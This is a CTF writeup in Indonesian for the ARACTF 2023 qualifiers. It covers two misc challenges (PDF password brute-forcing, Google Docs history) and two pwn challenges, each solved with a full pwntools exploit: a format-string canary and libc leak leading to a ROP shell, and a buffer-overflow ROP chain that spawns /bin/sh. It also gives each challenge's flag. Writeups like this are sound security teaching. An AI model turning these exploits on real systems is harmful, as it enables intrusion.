+++
title = "ARACTF 2023 Quals"
date = 2023-02-26
draft = false
categories = ["CTF Writeups"]
tags = ["aractf", "misc", "pwn", "writeup"]
summary = "Writeup tim CP Enjoyer untuk challenge Misc (Truth, in-sanity check) dan Pwn (nasgor komplek, basreng komplek) di ARACTF 2023 babak kualifikasi."
+++

Writeup dari tim **CP Enjoyer** untuk ARACTF 2023 babak kualifikasi — hanya bagian **Misc** (Truth, in-sanity check) dan **Pwn** (nasgor komplek, basreng komplek).

---

# Misc

## Truth (176 pts)

{{< admonition quote "Deskripsi" >}}
Kuronushi traveled far away from his country to learn something about himself. He never sure about his identity. Untill One day, he met a sage who gave him a book of truth. The sage said " To understand about yourself,Erase the title and find the Bigger case"

Submit the flag on this format `ARA2023{}`. Separate the sentences with `_`.

**Author:** Zangetsu#2398

**Attachments:** `Truth.pdf`
{{< /admonition >}}

### Analisis awal

Diberikan suatu file `Truth.pdf` yang tidak diketahui passwordnya. Kami melakukan bruteforce password dengan `pdfcrack` menggunakan wordlist `rockyou.txt`. Password yang didapatkan adalah `subarukun`.

{{< image src="truth-pdfcrack.png" caption="pdfcrack berhasil menemukan password Truth.pdf" height=230 >}}

### Mendapatkan flag

PDF yang berhasil dibuka berisi cerita yang cukup panjang. Berdasarkan clue yang diberikan pada deskripsi soal, kami hanya perlu mengambil huruf uppercase kecuali pada title cerita tersebut. Berikut solver yang kami gunakan.

**solver.py**

```python
a = "Sumeru's story is a wild ride from the ..."
for i in a:
    if ((ord(i) >= ord('A')) and (ord(i) <= ord('Z'))):
        print(i, end="")
```

Setelah itu, kami tinggal memisahkan masing-masing kata dengan underscore.

> Flag: `ARA2023{SOUNDS_LIKE_FANDAGO}`

## in-sanity check (100 pts)

{{< admonition quote "Deskripsi" >}}
Even the flag for sanity check is gone?

**Author:** circlebytes#5520

**Attachments:** Google Docs link
{{< /admonition >}}

### Analisis awal

Diberikan link gdocs yang setelah kami buka terdapat banyak orang yang sedang berinteraksi di sana. Kami langsung berpikir untuk memeriksa riwayat dari gdocs tersebut.

### Mendapatkan flag

Ternyata terdapat flag pada saat gdocs pertama kali dibuat.

{{< image src="insanity-gdocs.png" caption="Flag ditemukan pada riwayat versi Google Docs" >}}

> Flag: `ARA2023{w3lc0m3_4nd_h4v3_4_gr3at_ctfs}`

---

# Pwn

## nasgor komplek (496 pts)

{{< admonition quote "Deskripsi" >}}
abang Ubun nasi gorengnya memang enak tapi lebih enak lagi jika di traktir ka 0xdc9 <3 #ARA2023

**Author:** beenchilling#4944

`nc 103.152.242.116 20378`
{{< /admonition >}}

### Analisis awal

Diberikan servis yang apabila dibuka, terdapat dua pilihan, yaitu mesen dan ambil pesan.

{{< image src="nasgor-menu.png" caption="Menu service (mesen / ambil pesanan)" height=80 >}}

Pada pilihan `mesen`, terdapat vulnerability format string sehingga kita dapat leak isi stack. Maka, kami membuat script untuk menampilkan isi stack pada offset 1 sampai 100.

### Leak canary dan libc

**leak.py**

```python
from pwn import *
p = remote('103.152.242.116', 20378)
for i in range(100):
    p.sendlineafter(b'>>>\n', b'1')
    p.sendlineafter(b'mau pesen apa masse?\n', b'%' + str(i+1).encode() + b'$llx')
    p.recvuntil(b'mau ini ')
    leak = p.recvuntil(b' ')
    print(i+1, leak.decode())
```

{{< image-row height=360 >}}
{{< image src="nasgor-leak1.png" caption="Leak isi stack (run pertama)" >}}
{{< image src="nasgor-leak2.png" caption="Leak isi stack (run kedua)" >}}
{{< /image-row >}}

Setelah menjalankan program tersebut dua kali, terlihat pada offset 11 terdapat canary, dan terdapat beberapa alamat yang memiliki 3 digit terakhir dekat canary tersebut. Setelah mencari di libc.rip untuk symbol `__libc_start_main_ret`, didapatkan offset 17 merupakan alamat dari symbol tersebut. Didapatkan dua libc yang memenuhi persyaratan, maka kami menggunakan `libc6_2.27-3ubuntu1.5_amd64.so`. Setelah itu, kami membuat script untuk leak canary, leak `__libc_start_main_ret` untuk ret2libc dan ret2syscall.

### Mendapatkan shell

**solve.py**

```python
from pwn import *
libc = ELF('libc6_2.27-3ubuntu1.5_amd64.so', checksec=False)
p = remote('103.152.242.116', 20378)
context.log_level = 'debug'
p.sendlineafter(b'>>>\n', b'1')
p.sendlineafter(b'mau pesen apa masse?\n', b'%11$llx')
p.recvuntil(b'mau ini ')
canary = p64(eval('0x' + p.recvuntilS(b' ')))
log.info(canary)
p.sendlineafter(b'>>>\n', b'1')
p.sendlineafter(b'mau pesen apa masse?\n', b'%17$llx')
p.recvuntil(b'mau ini ')
leak = eval('0x' + p.recvuntilS(b' '))
log.info(hex(leak))
libc.address += leak - 0x21c87
pop_rdi = p64(libc.address + 0x2164f)
pop_rsi = p64(libc.address + 0x23a6a)
pop_rdx = p64(libc.address + 0x1b96)
pop_rax = p64(libc.address + 0x01b500)
binsh = p64(next(libc.search(b'/bin/sh\x00')))
syscall = p64(libc.address + 0xd2625)
payload = b'a'*136 + canary + b'b'*8 + pop_rdi + binsh + pop_rsi + p64(0) + pop_rdx + p64(0) + pop_rax + p64(0x3b) + syscall
p.sendlineafter(b'>>>\n', b'2')
p.sendlineafter(b'atau saran?\n', payload)
p.interactive()
```

Setelah menjalankan program tersebut, didapatkan shell dan flag.

{{< image src="nasgor-flag.png" caption="Berhasil mendapatkan shell dan flag" height=400 >}}

> Flag: `ARA2023{masak_ga_liat_tapi_enak_m3m4ng_0P_orz}`

## basreng komplek (460 pts)

{{< admonition quote "Deskripsi" >}}
aku suka basreng. apalagi kalau di bawain dari bogor sama ka Aseng. #ARA2023

**Author:** beenchilling#4944

**Attachments:** `basreng_komplek_parti.zip`, `vuln`

`nc 103.152.242.116 20371`
{{< /admonition >}}

### Analisis awal

Diberikan servis yang apabila dibuka akan diminta input. Diberikan juga suatu binary `vuln` yang memiliki fungsi-fungsi `a` sampai `h`. Terdapat vulnerability buffer overflow dan RIP terletak pada offset 72. Dengan menggunakan gadget-gadget yang diberikan pada fungsi-fungsi `a` sampai `h` tadi, kita bisa mendapatkan shell.

### Mendapatkan shell

**solve.py**

```python
from pwn import *
exe = './vuln'
elf = ELF(exe, checksec=False)
p = remote('103.152.242.116', 20371)
#p = process(exe)
context.log_level = 'debug'
cmd = """
bp 0x401192
bp 0x40119d
c
"""
#gdb.attach(p, cmd)
bss = p64(0x404040)
gadget = p64(0x401126) # mov qword [rdi], rsi
pop_rdi = p64(0x4011fb)
pop_rsi_r15 = p64(0x4011f9)
mov_rax_0x40 = p64(0x40114d)
sub_rax_0x6 = p64(0x40115b)
add_rax_0x1 = p64(0x401166)
syscall = p64(0x401130)
payload = b'a'*72 + pop_rdi + bss + pop_rsi_r15 + b'/bin/sh\x00' + p64(0) + gadget + p64(0) + pop_rsi_r15 + p64(0)*2 + mov_rax_0x40 + p64(0) + sub_rax_0x6 + p64(0) + add_rax_0x1 + p64(0) + syscall
p.sendline(payload)
p.interactive()
```

{{< image src="basreng-flag.png" caption="Berhasil mendapatkan shell dan flag" height=300 >}}

> Flag: `ARA2023{CUST0M_ROP_D3f4ult_b4sr3ng}`
